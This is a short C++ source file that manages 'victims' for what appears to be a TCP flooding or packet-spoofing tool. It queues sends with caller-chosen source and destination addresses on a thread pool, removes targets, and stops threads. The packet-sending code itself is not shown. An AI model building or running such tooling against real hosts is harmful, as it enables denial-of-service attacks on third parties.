#include "victim_manipulation.h"

void victims::add_victim(const char* iph_sourceip, const char* tcph_srcport, const char* iph_destip, const char* tcph_destport) {
	pool.enqueue([=] { send.send_tcp(iph_sourceip, tcph_srcport, iph_destip, tcph_destport); });
}

void victims::remove_victim(const char* dest_ip, const char* dest_port) {
	send.victims_to_remove.insert(std::make_pair(dest_ip, dest_port));
}

void victims::clear_thread_pool(int threads) {
	for (int thread = 0; thread < threads; thread++) {
		pool.insert_pill(thread);
	}
}

void victims::clear_thread(int thread) { pool.insert_pill(thread); }